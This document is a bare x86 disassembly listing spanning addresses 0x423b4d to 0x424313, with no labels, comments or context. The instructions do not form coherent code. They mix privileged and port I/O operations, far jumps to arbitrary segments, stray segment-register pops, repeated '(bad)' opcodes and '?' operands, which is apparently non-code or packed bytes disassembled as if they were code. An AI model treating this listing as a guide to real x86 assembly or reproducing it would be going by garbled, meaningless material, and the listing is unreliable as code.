  423b4d:	or     cl,BYTE PTR [edx+0x601aea0]
  423b53:	xor    ebx,DWORD PTR [edi-0x265d1713]
  423b59:	add    DWORD PTR [eax-0x33],0x47cecd
  423b60:	retf   
  423b61:	mov    bl,0x45
  423b63:	int3   
  423b64:	pop    es
  423b65:	sbb    al,0x5
  423b67:	jecxz  0x423bdf
  423b69:	inc    BYTE PTR [ebx+eax*2+0x52]
  423b6d:	pop    es
  423b6e:	jo     0x423be5
  423b70:	cmp    al,0xcc
  423b72:	fbld   TBYTE PTR [esi+ebp*1-0x3e776ae5]
  423b79:	mov    al,ds:0x4e52dda1
  423b7e:	push   ebx
  423b7f:	dec    ecx
  423b80:	enter  0xbeab,0x1e
  423b84:	mov    ds:0x2ae2bf7e,eax
  423b89:	pop    ebp
  423b8a:	push   edx
  423b8b:	pop    esi
  423b8c:	in     al,dx
  423b8d:	imul   edx,DWORD PTR [edi-0x5e],0xffffffea
  423b91:	cmc    
  423b92:	lods   eax,DWORD PTR ds:[esi]
  423b93:	cmp    BYTE PTR [ebp+0x7b],dh
  423b96:	add    ebp,DWORD PTR [ecx]
  423b98:	outs   dx,DWORD PTR ds:[esi]
  423b99:	and    dh,BYTE PTR [ebp+esi*2-0x33764b70]
  423ba0:	mov    esp,0xac0c15ec
  423ba5:	loopne 0x423bc7
  423ba7:	xor    eax,edx
  423ba9:	xchg   ebp,eax
  423baa:	iret   
  423bab:	xor    BYTE PTR [ecx],0x63
  423bae:	fdiv   st,st(3)
  423bb0:	lea    ebx,[ebx-0x3a]
  423bb3:	mov    al,0x8e
  423bb5:	loope  0x423c15
  423bb7:	add    al,0x25
  423bb9:	daa    
  423bba:	or     DWORD PTR [ecx],0xeb76d1ae
  423bc0:	hlt    
  423bc1:	sub    BYTE PTR [edi-0x43],bl
  423bc4:	lea    ebx,ds:0x1749efa7
  423bca:	cs ins DWORD PTR es:[edi],dx
  423bcc:	dec    ebx
  423bcd:	dec    eax
  423bce:	mov    BYTE PTR [edx],0x74
  423bd1:	xchg   ecx,eax
  423bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423bd3:	lds    esi,FWORD PTR ds:0xa9349ecf
  423bd9:	pusha  
  423bda:	mov    ecx,0x1608374f
  423bdf:	and    cl,BYTE PTR [ecx+0x3f450471]
  423be5:	sub    BYTE PTR [edi+0x42],bl
  423be8:	shr    DWORD PTR [edx-0x1a799798],0x63
  423bef:	push   ebp
  423bf0:	mov    bl,0x80
  423bf2:	sbb    al,0x2f
  423bf4:	in     eax,0xf9
  423bf6:	sub    al,0xdf
  423bf8:	stc    
  423bf9:	ins    BYTE PTR es:[edi],dx
  423bfa:	arpl   WORD PTR [eax],sp
  423bfc:	jne    0x423bf6
  423bfe:	imul   ecx,eax,0x67dd0dad
  423c04:	loopne 0x423bc7
  423c06:	jmp    0xdc10:0x68bb8ce5
  423c0d:	out    dx,al
  423c0e:	mov    DWORD PTR [esi],ebp
  423c10:	mov    bl,0x24
  423c12:	cli    
  423c13:	pop    ebp
  423c14:	test   BYTE PTR [esi*4-0x492a74c5],ah
  423c1b:	pop    edi
  423c1c:	add    DWORD PTR [eax+eiz*8+0x48],eax
  423c20:	enter  0x5afd,0xa8
  423c24:	cmc    
  423c25:	jle    0x423c18
  423c27:	xchg   BYTE PTR [ebp-0x37],cl
  423c2a:	dec    esp
  423c2b:	sti    
  423c2c:	(bad)  
  423c2d:	call   DWORD PTR [ebp+0x6c80e87a]
  423c33:	add    eax,0xf2d3d4c0
  423c38:	into   
  423c39:	jg     0x423c63
  423c3b:	inc    ebx
  423c3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c3d:	pop    ebx
  423c3e:	out    0x74,al
  423c40:	data16 sahf 
  423c42:	jb     0x423c52
  423c44:	(bad)
  423c48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c49:	pop    edi
  423c4a:	mov    ecx,DWORD PTR [ebx+ebx*1]
  423c4d:	add    al,0x88
  423c4f:	(bad)  
  423c50:	xchg   esp,eax
  423c51:	pusha  
  423c52:	fidiv  WORD PTR [edx-0x54]
  423c55:	cdq    
  423c56:	popf   
  423c57:	adc    eax,0xd09c0b01
  423c5c:	cwde   
  423c5d:	dec    edi
  423c5e:	cdq    
  423c5f:	mov    edi,0xfe9dbf4c
  423c64:	xor    edi,esi
  423c66:	mov    bh,bl
  423c68:	mov    WORD PTR [ecx],fs
  423c6a:	or     al,bl
  423c6c:	mov    ?,WORD PTR [ebx-0x61ceb7e7]
  423c72:	push   0x61
  423c74:	pop    ds
  423c75:	ds ds xor eax,0xa45e3b70
  423c7c:	fwait
  423c7d:	imul   eax,DWORD PTR [ebx+0x3],0x130b6efb
  423c84:	jnp    0x423c1c
  423c86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c87:	stos   DWORD PTR es:[edi],eax
  423c88:	lea    edx,[ebx+0x228350c3]
  423c8e:	and    DWORD PTR [eax+0x278a67a1],ebp
  423c94:	lea    esi,[edx-0x169133ab]
  423c9a:	xor    DWORD PTR [esi],0xe0ec824f
  423ca0:	fwait
  423ca1:	mov    esi,DWORD PTR [ebx]
  423ca3:	adc    DWORD PTR [edx+0x3376446f],esi
  423ca9:	inc    edx
  423caa:	scas   eax,DWORD PTR es:[edi]
  423cab:	and    ecx,esp
  423cad:	adc    eax,DWORD PTR [ebx-0x34]
  423cb0:	jnp    0x423d28
  423cb2:	push   ecx
  423cb3:	dec    ebp
  423cb4:	out    dx,al
  423cb5:	push   ss
  423cb6:	mov    al,0xb1
  423cb8:	jnp    0x423c41
  423cba:	jbe    0x423c67
  423cbc:	in     eax,0x66
  423cbe:	iret   
  423cbf:	(bad)  
  423cc0:	sti    
  423cc1:	fldcw  WORD PTR ds:0x343976e5
  423cc7:	xor    BYTE PTR [esi],0xfb
  423cca:	int    0xd7
  423ccc:	sub    al,0x5f
  423cce:	adc    esi,ebx
  423cd0:	clc    
  423cd1:	jle    0x423ce5
  423cd3:	(bad)  
  423cd4:	and    dh,dh
  423cd6:	mov    al,0xb0
  423cd8:	outs   dx,DWORD PTR ds:[esi]
  423cd9:	stos   BYTE PTR es:[edi],al
  423cda:	xchg   DWORD PTR [edi],ebx
  423cdc:	sbb    DWORD PTR [esi-0x69],esp
  423cdf:	or     eax,0x666f994c
  423ce4:	hlt    
  423ce5:	mov    esp,0x40d83d88
  423cea:	add    al,0xf
  423cec:	pop    edx
  423ced:	inc    edx
  423cee:	adc    ebp,edx
  423cf0:	inc    eax
  423cf1:	ja     0x423cf7
  423cf3:	push   cs
  423cf4:	sbb    BYTE PTR [edx+eiz*2],cl
  423cf7:	cli    
  423cf8:	and    DWORD PTR [ebx*4+0x76e26636],esp
  423cff:	jb     0x423d35
  423d01:	fcomi  st,st(0)
  423d03:	jnp    0x423ca9
  423d05:	retf   
  423d06:	cmc    
  423d07:	adc    cl,dl
  423d09:	rcr    DWORD PTR [ecx],0xa1
  423d0c:	arpl   ax,sp
  423d0e:	pop    ebp
  423d0f:	daa    
  423d10:	cld    
  423d11:	in     eax,dx
  423d12:	jns    0x423d04
  423d14:	sub    eax,0x2f69da97
  423d19:	push   cs
  423d1a:	rcl    BYTE PTR [eax+0x31],0x53
  423d1e:	xchg   ebp,eax
  423d1f:	div    bh
  423d21:	mov    ebx,0x75eb28ea
  423d26:	int3   
  423d27:	ins    BYTE PTR es:[edi],dx
  423d28:	and    al,0x6f
  423d2a:	popa   
  423d2b:	cmc    
  423d2c:	push   0xc79479f0
  423d31:	sbb    BYTE PTR [ecx+eax*2+0x53],bl
  423d35:	aam    0x90
  423d37:	adc    edx,edi
  423d39:	sub    DWORD PTR [ebx-0x49],ecx
  423d3c:	mov    ds:0xdc0f10d6,eax
  423d41:	test   DWORD PTR [edi],ebp
  423d43:	test   BYTE PTR [eax-0x35717ae4],al
  423d49:	adc    BYTE PTR [edx+0xb8b9eb4],dl
  423d4f:	not    BYTE PTR [esi-0x673f2412]
  423d55:	sbb    BYTE PTR [ecx+0x27],ah
  423d58:	sub    BYTE PTR [ebx+0x55],al
  423d5b:	or     DWORD PTR [edi+edi*2-0x71],ebx
  423d5f:	push   ss
  423d60:	mov    bl,0x6d
  423d62:	test   al,0x5c
  423d64:	jb     0x423db9
  423d66:	arpl   WORD PTR [ebx+0x2ce067f0],ax
  423d6c:	int    0x3d
  423d6e:	jge    0x423d24
  423d70:	mov    ?,WORD PTR [edi-0x7]
  423d73:	loope  0x423d54
  423d75:	push   esp
  423d76:	fnstsw WORD PTR [esp+ecx*2]
  423d79:	inc    ebp
  423d7a:	popf   
  423d7b:	push   0xd19a3a60
  423d80:	inc    ebx
  423d81:	xor    al,BYTE PTR [edx+eax*1-0x53]
  423d85:	aad    0x3f
  423d87:	sbb    esp,DWORD PTR [eax+0x3390facc]
  423d8d:	fadd   DWORD PTR [eax-0x6868c1f8]
  423d93:	out    0xc,eax
  423d95:	mov    eax,ds:0x5fd7d1c2
  423d9a:	bound  ebx,QWORD PTR [ecx+0xf0b3d50]
  423da0:	mov    BYTE PTR [ecx+eax*1],dh
  423da3:	je     0x423e0e
  423da5:	mov    dl,0x1d
  423da7:	mov    cl,0x13
  423da9:	fwait
  423daa:	shr    DWORD PTR [edi],0xda
  423dad:	std    
  423dae:	add    BYTE PTR [esi+edi*4-0x36],ch
  423db2:	dec    eax
  423db3:	push   ds
  423db4:	push   DWORD PTR [edi+0x43c5de03]
  423dba:	mov    eax,0x1af4bfe1
  423dbf:	popa   
  423dc0:	call   DWORD PTR [eax]
  423dc2:	pop    ds
  423dc3:	pop    ds
  423dc4:	jns    0x423d78
  423dc6:	xchg   ebx,eax
  423dc7:	scas   al,BYTE PTR es:[edi]
  423dc8:	mov    esp,0x32981d48
  423dcd:	fwait
  423dce:	aad    0x28
  423dd0:	test   edi,ebx
  423dd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423dd3:	sbb    bh,BYTE PTR [edi]
  423dd5:	sub    ebx,ecx
  423dd7:	sub    bh,BYTE PTR [ebp-0xbbf6366]
  423ddd:	dec    eax
  423dde:	mov    al,0xc6
  423de0:	aam    0xee
  423de2:	mov    al,0xff
  423de4:	test   eax,0xf2fbe792
  423de9:	test   DWORD PTR [bx+si-0x136a],ebx
  423dee:	jo     0x423da1
  423df0:	nop
  423df1:	jns    0x423e71
  423df3:	mov    ds:0x75ffd3cc,eax
  423df8:	ins    DWORD PTR es:[edi],dx
  423df9:	sbb    ecx,DWORD PTR es:[ebp+0x21]
  423dfd:	outs   dx,DWORD PTR ds:[esi]
  423dfe:	adc    BYTE PTR [ebx],al
  423e00:	lea    esp,[edx+0x6bbd7d95]
  423e06:	stos   DWORD PTR es:[edi],eax
  423e07:	xchg   DWORD PTR [ebx],edi
  423e09:	mov    ecx,0xbac4c2aa
  423e0e:	fist   DWORD PTR [ecx-0x62]
  423e11:	sub    BYTE PTR [esi-0x71],ch
  423e14:	adc    al,0x65
  423e16:	sbb    bh,dh
  423e18:	add    eax,0xf7d53e47
  423e1d:	push   ds
  423e1e:	cmp    cl,BYTE PTR [ecx-0x6e7065b8]
  423e24:	push   eax
  423e25:	jmp    0x423e8f
  423e27:	jle    0x423dfb
  423e29:	or     ecx,DWORD PTR [edi-0x3df2737a]
  423e2f:	inc    ebx
  423e30:	jmp    0x5addd91a
  423e35:	and    DWORD PTR [esp+ebx*4],ebp
  423e38:	sub    DWORD PTR [ebp+0x5],esi
  423e3b:	dec    eax
  423e3c:	ret    
  423e3d:	inc    BYTE PTR [edx-0x1dd355da]
  423e43:	jbe    0x423e6a
  423e45:	xchg   edi,eax
  423e46:	mov    ebx,0x2a76ca63
  423e4b:	mov    esp,DWORD PTR [edi+eiz*2]
  423e4e:	call   DWORD PTR [ecx+eiz*2+0x562d119a]
  423e55:	fs mov bl,0x0
  423e58:	icebp  
  423e59:	punpcklwd mm0,DWORD PTR [ebp-0x5d]
  423e5d:	mov    ss,ebx
  423e5f:	jl     0x423e5d
  423e61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e62:	(bad)  
  423e63:	into   
  423e64:	call   0x6998c92d
  423e69:	lea    ecx,ss:[edi+0x78]
  423e6d:	lahf   
  423e6e:	push   edi
  423e6f:	(bad)  
  423e70:	push   ss
  423e71:	dec    esi
  423e72:	(bad)  
  423e73:	push   ebp
  423e74:	mov    esp,0x4eb9175
  423e79:	int3   
  423e7a:	add    eax,0x4daf372e
  423e7f:	jp     0x423e92
  423e81:	xchg   ebp,eax
  423e82:	sbb    al,0xf0
  423e84:	sub    BYTE PTR [edi+0x28],bh
  423e87:	and    al,0x12
  423e89:	mov    dl,BYTE PTR [ebx+0x4af859a1]
  423e8f:	cmp    BYTE PTR [edi+0x24a38286],bl
  423e95:	outs   dx,BYTE PTR ds:[esi]
  423e96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e97:	pop    ecx
  423e98:	cwde   
  423e99:	mov    esi,0xfd7201ed
  423e9e:	xchg   BYTE PTR [eax],ah
  423ea0:	mov    ecx,0x6cd8f725
  423ea5:	stos   DWORD PTR es:[edi],eax
  423ea6:	xchg   ebx,eax
  423ea7:	clc    
  423ea8:	sbb    edi,0x133f4bca
  423eae:	or     dl,ch
  423eb0:	adc    al,0xe1
  423eb2:	fdivrp st(5),st
  423eb4:	xchg   ebx,eax
  423eb5:	test   DWORD PTR [edi-0x78bfb461],edi
  423ebb:	test   al,0xa7
  423ebd:	sub    BYTE PTR [edi-0x7169a777],cl
  423ec3:	sbb    ebx,0xc96a9787
  423ec9:	xor    ecx,DWORD PTR [ebx-0x25]
  423ecc:	aad    0x51
  423ece:	or     edi,edx
  423ed0:	cmp    eax,0xf8157b38
  423ed5:	dec    edi
  423ed6:	xor    DWORD PTR [ebp-0xc],ecx
  423ed9:	ror    esi,0x28
  423edc:	das    
  423edd:	into   
  423ede:	es enter 0x397b,0x58
  423ee3:	in     al,0xdb
  423ee5:	iret   
  423ee6:	xchg   ebx,eax
  423ee7:	xor    bl,BYTE PTR [eax+0x64]
  423eea:	lea    eax,[edi]
  423eec:	dec    eax
  423eed:	push   0x99b5089a
  423ef2:	add    BYTE PTR [edi],al
  423ef4:	call   0x3eb9:0x14879b98
  423efb:	mov    ecx,0x68a0c6dd
  423f00:	sbb    al,0x27
  423f02:	imul   WORD PTR [ecx+0x1f7cf510]
  423f09:	push   esp
  423f0a:	retf   
  423f0b:	ins    DWORD PTR es:[edi],dx
  423f0c:	jg     0x423f6a
  423f0e:	xchg   edx,eax
  423f0f:	mov    esi,0x658d8d5c
  423f14:	xbegin 0xc7be6d02
  423f1a:	js     0x423ebd
  423f1c:	push   ecx
  423f1d:	test   eax,0x9f7e793a
  423f22:	push   0xffffff94
  423f24:	push   0x21
  423f26:	ja     0x423f0d
  423f28:	mov    DWORD PTR [bx-0x6e3e],0xca26fe4b
  423f31:	and    eax,0xef549a86
  423f36:	xor    ch,BYTE PTR [ebp+0x30]
  423f39:	les    eax,FWORD PTR [edi]
  423f3b:	mov    eax,0x45724cbf
  423f40:	and    al,0x79
  423f42:	or     eax,0x3f174720
  423f47:	xlat   BYTE PTR ds:[ebx]
  423f48:	push   ecx
  423f49:	outs   dx,DWORD PTR ds:[esi]
  423f4a:	xor    BYTE PTR [eax+ecx*2-0x7eb19e50],ah
  423f51:	push   ecx
  423f52:	rol    BYTE PTR [esi+0x67b2435c],1
  423f58:	repnz push es
  423f5a:	xchg   esp,eax
  423f5b:	push   esi
  423f5c:	lahf   
  423f5d:	loopne 0x423ee3
  423f5f:	sub    eax,DWORD PTR [esi+ecx*2-0x7]
  423f63:	inc    ebp
  423f64:	mov    dh,0xc1
  423f66:	jecxz  0x423f8d
  423f68:	sub    al,0x93
  423f6a:	xchg   esi,eax
  423f6b:	shl    dh,0xa2
  423f6e:	adc    edi,DWORD PTR fs:[edx-0xc4665cf]
  423f75:	pop    eax
  423f76:	ret    
  423f77:	ret    
  423f78:	mov    esp,0xd7f01d08
  423f7d:	xchg   esi,eax
  423f7e:	inc    ecx
  423f7f:	outs   dx,DWORD PTR ds:[esi]
  423f80:	jmp    0xef35a943
  423f85:	push   edx
  423f86:	add    ch,BYTE PTR [ebx]
  423f88:	and    eax,0xce54f7ac
  423f8d:	rcr    DWORD PTR [eax+0x61ee833d],1
  423f93:	push   cs
  423f94:	enter  0x4364,0x80
  423f98:	lock cmp al,0xdd
  423f9b:	call   0xe83b:0x1f3ab1e6
  423fa2:	shl    cl,0x87
  423fa5:	sahf   
  423fa6:	cmp    DWORD PTR [ecx-0x31],edi
  423fa9:	and    dh,BYTE PTR [ecx]
  423fab:	pop    edi
  423fac:	lds    ecx,FWORD PTR [ebx+0x4a]
  423faf:	jge    0x423f8a
  423fb1:	shl    BYTE PTR [ebp-0x7a],cl
  423fb4:	(bad)  
  423fb5:	pop    ds
  423fb6:	xchg   ecx,eax
  423fb7:	scas   eax,DWORD PTR es:[edi]
  423fb8:	mov    ss,WORD PTR [eax]
  423fba:	loope  0x423f53
  423fbc:	sti    
  423fbd:	into   
  423fbe:	loopne 0x423f93
  423fc0:	cmp    eax,0x4be0d944
  423fc5:	add    dl,cl
  423fc7:	rol    bh,0xcd
  423fca:	popf   
  423fcb:	clc    
  423fcc:	mov    WORD PTR ds:0x485b14bf,?
  423fd2:	push   0xffffffcf
  423fd4:	add    BYTE PTR [edx],dh
  423fd6:	mov    eax,0xed24748
  423fdb:	lods   al,BYTE PTR ds:[esi]
  423fdc:	cdq    
  423fdd:	mov    ecx,0xd574fd57
  423fe2:	jnp    0x423ff6
  423fe4:	lock cmp al,0x59
  423fe7:	cwde   
  423fe8:	dec    esi
  423fe9:	fsub   QWORD PTR ds:0xd5815401
  423fef:	fmul   st(1),st
  423ff1:	cmp    al,dl
  423ff3:	test   al,0x82
  423ff5:	scas   al,BYTE PTR es:[edi]
  423ff6:	lock push eax
  423ff8:	pop    ecx
  423ff9:	xchg   ebp,eax
  423ffa:	ds pop ss
  423ffc:	jo     0x423f8f
  423ffe:	cdq    
  423fff:	call   0x9b52818f
  424004:	xor    eax,0x9d22ea18
  424009:	add    eax,0x82f3e77
  42400e:	ret    0xa2a6
  424011:	(bad)  
  424013:	push   ss
  424014:	in     eax,0x42
  424016:	sti    
  424017:	cli    
  424018:	pop    ss
  424019:	rol    dl,1
  42401b:	push   eax
  42401c:	add    esi,DWORD PTR [edi+ecx*4-0x36]
  424020:	sub    esp,DWORD PTR fs:[esi+0x4171fbf8]
  424027:	sar    bl,cl
  424029:	xor    DWORD PTR [ecx+0x69],0xcd4f8d0b
  424030:	jp     0x423fde
  424032:	xor    BYTE PTR [ecx],dl
  424034:	popf   
  424035:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424036:	mov    es,WORD PTR [ecx]
  424038:	shl    DWORD PTR [ebp-0x441d6a34],1
  42403e:	aad    0x3a
  424040:	test   al,0x19
  424042:	ss or  ebp,edi
  424045:	mov    eax,ds:0x5c1cc07c
  42404a:	add    DWORD PTR [eax+0x3d58ba97],0x3f
  424051:	aaa    
  424052:	jne    0x424049
  424054:	jnp    0x424092
  424056:	stos   DWORD PTR es:[edi],eax
  424057:	push   esi
  424058:	push   0xffffff9c
  42405a:	xor    ah,bl
  42405c:	call   0xe65a68b1
  424061:	jno    0x424010
  424063:	adc    eax,0x255f81df
  424068:	ja     0x42408f
  42406a:	inc    esi
  42406b:	mov    edx,0xa7e5a5ba
  424070:	inc    esp
  424071:	and    BYTE PTR [edi+edi*1],al
  424074:	mov    dh,0x7c
  424076:	and    DWORD PTR gs:[esi+0x5f],edi
  42407a:	fdivr  QWORD PTR [ebp+0xc]
  42407d:	dec    esi
  42407e:	or     al,0xbe
  424080:	xchg   ebp,eax
  424081:	xor    eax,0x207fb0ee
  424086:	xor    cl,cl
  424088:	and    DWORD PTR [ecx-0x37ab988f],esp
  42408e:	push   ebp
  42408f:	into   
  424090:	gs push edx
  424092:	pop    ebp
  424093:	mov    dl,0x94
  424095:	xlat   BYTE PTR ds:[ebx]
  424096:	dec    ebp
  424097:	push   ds
  424098:	jg     0x424085
  42409a:	ret    
  42409b:	dec    esi
  42409c:	mov    ch,0xa4
  42409e:	fcomi  st,st(5)
  4240a0:	sti    
  4240a1:	cmp    eax,ebp
  4240a3:	adc    al,0xb9
  4240a5:	inc    edi
  4240a6:	mov    ebx,0xc20934e5
  4240ab:	xchg   dl,bl
  4240ad:	pusha  
  4240ae:	sub    eax,0x34afe1cc
  4240b3:	mov    eax,0xbff0f62f
  4240b8:	out    0x21,eax
  4240ba:	ds stc 
  4240bc:	and    BYTE PTR [esi],dh
  4240be:	pop    edx
  4240bf:	scas   al,BYTE PTR es:[edi]
  4240c0:	inc    ebx
  4240c1:	mov    WORD PTR [eax-0x5],gs
  4240c4:	push   eax
  4240c5:	push   edi
  4240c6:	add    eax,0xd70f2650
  4240cb:	adc    DWORD PTR [ecx-0xd94274b],0xffffff8e
  4240d2:	(bad)  
  4240d3:	fnstenv [ebx+0x2bdc12d8]
  4240d9:	(bad)  
  4240da:	lock cmc 
  4240dc:	mov    bh,0x3f
  4240de:	fld    QWORD PTR [eax-0x15ab546a]
  4240e4:	dec    esi
  4240e5:	fstp   TBYTE PTR fs:[edi-0x3d4b6ab1]
  4240ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240ed:	es cwde 
  4240ef:	je     0x4240b1
  4240f1:	test   BYTE PTR [ebp+0x715f558b],bh
  4240f7:	jo     0x424172
  4240f9:	push   eax
  4240fa:	dec    eax
  4240fb:	add    ah,ch
  4240fd:	mov    ds:0x5364296f,al
  424102:	jns    0x424157
  424104:	mov    bl,0x70
  424106:	aaa    
  424107:	fs ret 
  424109:	fsubp  st(4),st
  42410b:	mov    ch,0x2d
  42410d:	xor    eax,0x26a09104
  424112:	hlt    
  424113:	and    edx,DWORD PTR [ebx+0x15]
  424116:	xchg   edx,eax
  424117:	imul   edi,ecx,0x27d6e7a7
  42411d:	stos   BYTE PTR es:[edi],al
  42411e:	inc    ebx
  42411f:	in     eax,0xac
  424121:	(bad)  
  424122:	mov    bl,0xd1
  424124:	pop    edi
  424125:	sub    eax,0xe3e8cd97
  42412a:	ds in  eax,dx
  42412c:	in     eax,dx
  42412d:	inc    esi
  42412e:	scas   eax,DWORD PTR es:[edi]
  42412f:	and    ebx,ebp
  424131:	lods   al,BYTE PTR ds:[esi]
  424132:	xchg   edi,eax
  424133:	lea    esp,[ebp-0x8]
  424136:	arpl   WORD PTR [ebp-0x61454e2a],sp
  42413c:	aaa    
  42413d:	loopne 0x424111
  42413f:	clc    
  424140:	and    BYTE PTR [ebp-0x6e49b520],ah
  424146:	loop   0x424156
  424148:	xchg   ebx,eax
  424149:	popa   
  42414a:	push   ebx
  42414b:	and    eax,0xb321ddd5
  424150:	rcr    BYTE PTR [esi+0x6a],1
  424153:	jg     0x42411d
  424155:	pop    esp
  424156:	cld    
  424157:	adc    eax,0xd25f601d
  42415c:	sub    ebp,DWORD PTR ds:0xd91b12d0
  424162:	cwde   
  424163:	out    0xb6,eax
  424165:	inc    esp
  424166:	xlat   BYTE PTR ds:[ebx]
  424167:	in     al,0x52
  424169:	ja     0x42413c
  42416b:	sub    bh,BYTE PTR [ecx]
  42416d:	(bad)  [ebx]
  42416f:	xchg   ebp,eax
  424170:	mov    ds:0xe8033cdb,eax
  424175:	jmp    0xb8950723
  42417a:	mov    al,BYTE PTR [edx-0x59]
  42417d:	cwde   
  42417e:	loope  0x42414d
  424180:	(bad)  
  424181:	int3   
  424182:	pop    ss
  424183:	mov    cl,0x9b
  424185:	xchg   esi,eax
  424186:	sbb    BYTE PTR [ebp-0x2c],ah
  424189:	js     0x42413a
  42418b:	aas    
  42418c:	xor    eax,0x4adaf6d0
  424191:	not    BYTE PTR [edi]
  424193:	xor    esi,ebx
  424195:	inc    edi
  424196:	xor    al,0xd1
  424198:	inc    esi
  424199:	pandn  mm7,QWORD PTR [ebx+ebx*1+0x135b4fdc]
  4241a1:	pop    esp
  4241a2:	push   eax
  4241a3:	cmp    eax,0x64a3a0f6
  4241a8:	cld    
  4241a9:	add    eax,0x48249604
  4241ae:	sti    
  4241af:	jb     0x42414f
  4241b1:	cmc    
  4241b2:	pop    edi
  4241b3:	push   ecx
  4241b4:	pop    ecx
  4241b5:	and    edi,DWORD PTR [ebx+0x501201c4]
  4241bb:	dec    edx
  4241bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241bd:	mov    ah,0x8
  4241bf:	jge    0x42420d
  4241c1:	pop    eax
  4241c2:	cs sbb al,0x8b
  4241c5:	dec    esi
  4241c6:	push   eax
  4241c7:	add    eax,0x44e85e6d
  4241cc:	adc    BYTE PTR [eax+0x1c],cl
  4241cf:	js     0x4241fb
  4241d1:	cmp    DWORD PTR [esp],eax
  4241d4:	mov    al,BYTE PTR [ebx]
  4241d6:	stos   BYTE PTR es:[edi],al
  4241d7:	inc    esp
  4241d9:	mov    ecx,fs
  4241db:	mov    bl,0x5c
  4241dd:	outs   dx,BYTE PTR ds:[esi]
  4241de:	dec    BYTE PTR [esp+esi*1-0x70eabfc6]
  4241e5:	fcom   st(3)
  4241e7:	pop    ebp
  4241e8:	xor    cl,cl
  4241ea:	cli    
  4241eb:	nop
  4241ec:	push   ebx
  4241ed:	test   BYTE PTR [ebx+0x130e9cb0],bl
  4241f3:	pop    ebx
  4241f4:	mov    esp,0xcf91ffb5
  4241f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241fa:	mov    WORD PTR [esi+eax*8-0x26],?
  4241fe:	push   esi
  4241ff:	(bad)  
  424200:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424201:	jo     0x424185
  424203:	aas    
  424204:	shl    DWORD PTR [edi],1
  424206:	jle    0x424223
  424208:	or     edi,ebp
  42420a:	add    DWORD PTR [ebp-0x49],ebx
  42420d:	aam    0xd5
  42420f:	push   ecx
  424210:	inc    esp
  424211:	mov    ch,0xec
  424213:	inc    ebx
  424214:	jnp    0x42428b
  424216:	dec    esp
  424217:	enter  0xaf9f,0xe8
  42421b:	cmp    dl,BYTE PTR [esi+ecx*8+0x1e78b5b3]
  424222:	fadd   st(0),st
  424224:	pop    ds
  424225:	retf   0x4b83
  424228:	push   ebp
  424229:	mov    DWORD PTR [esi-0x5f],ebp
  42422c:	push   cs
  42422d:	das    
  42422e:	ror    DWORD PTR [edx+0x6f],1
  424231:	je     0x4241d9
  424233:	(bad)  
  424234:	or     eax,0x221e9746
  424239:	ret    0x7efb
  42423c:	pop    edi
  42423d:	mov    esi,0xa1c84175
  424242:	pop    edx
  424243:	test   al,0xdf
  424245:	xchg   esi,eax
  424246:	xor    esi,esi
  424248:	adc    BYTE PTR [edi+0x5a82fafa],ch
  42424e:	(bad)  
  42424f:	mov    ebp,eax
  424251:	popf   
  424252:	xor    BYTE PTR [eax],ah
  424254:	pop    edx
  424255:	lock nop
  424257:	mov    BYTE PTR [ecx+0x4c05a350],ah
  42425d:	mov    eax,ds:0x384c58ed
  424262:	xor    BYTE PTR [ebp-0x3c],dh
  424265:	ffreep st(7)
  424267:	clc    
  424268:	mov    eax,0x28bf38d6
  42426d:	cmp    esi,DWORD PTR [eax]
  42426f:	fidiv  WORD PTR [ebx]
  424271:	imul   esi,edi,0x5083aeff
  424277:	cld    
  424278:	test   BYTE PTR [edi+0x5c902e68],ah
  42427e:	mov    edi,0x5bd71737
  424283:	arpl   dx,bx
  424285:	jo     0x424207
  424287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424288:	jp     0x4242c1
  42428a:	xor    eax,0x82c5fc7a
  42428f:	std    
  424290:	jae    0x424224
  424292:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424293:	ret    0x7316
  424296:	loopne 0x424239
  424298:	pop    ss
  424299:	xchg   ebp,eax
  42429a:	test   eax,0xf5743afd
  42429f:	or     eax,0xd5a41366
  4242a4:	jl     0x424244
  4242a6:	xchg   ecx,eax
  4242a7:	neg    ecx
  4242a9:	outs   dx,BYTE PTR ds:[esi]
  4242aa:	aas    
  4242ab:	sub    BYTE PTR [esi+0x16a1414d],cl
  4242b1:	fsub   QWORD PTR [edx-0x7cf2954a]
  4242b7:	int3   
  4242b8:	test   al,0x5b
  4242ba:	sbb    eax,0xb0fe713d
  4242bf:	jnp    0x424270
  4242c1:	ret    0x2729
  4242c4:	pushf  
  4242c5:	adc    bh,BYTE PTR [esi]
  4242c7:	mov    DWORD PTR [ebp+0x62e7e803],edx
  4242cd:	pop    esp
  4242ce:	sahf   
  4242cf:	test   BYTE PTR [esi+edi*2],dl
  4242d2:	sub    DWORD PTR [edx+0x5d],ecx
  4242d5:	(bad)  
  4242d6:	out    0x4,eax
  4242d8:	int    0xec
  4242da:	mov    bh,0x33
  4242dc:	add    ebp,DWORD PTR ds:0x9339
  4242e1:	push   ss
  4242e2:	std    
  4242e3:	daa    
  4242e4:	cld    
  4242e5:	xchg   esi,eax
  4242e6:	jle    0x4242bb
  4242e8:	inc    ecx
  4242e9:	sub    eax,0x216ad1e6
  4242ee:	mov    cl,0x3c
  4242f0:	sub    DWORD PTR [ecx+0x482546c1],ecx
  4242f6:	stos   WORD PTR es:[edi],ax
  4242f8:	in     al,dx
  4242f9:	mov    al,ds:0x6638ea19
  4242fe:	jns    0x4242dc
  424300:	daa    
  424301:	push   ss
  424302:	inc    ebx
  424303:	icebp  
  424304:	data16 add dl,BYTE PTR [ebx-0x2f963ff6]
  42430b:	xchg   esp,eax
  42430c:	pop    eax
  42430d:	xchg   ebx,eax
  42430e:	sbb    cl,BYTE PTR [edi]
  424310:	inc    edi
  424311:	les    esp,FWORD PTR [ebx]
  424313:	nop
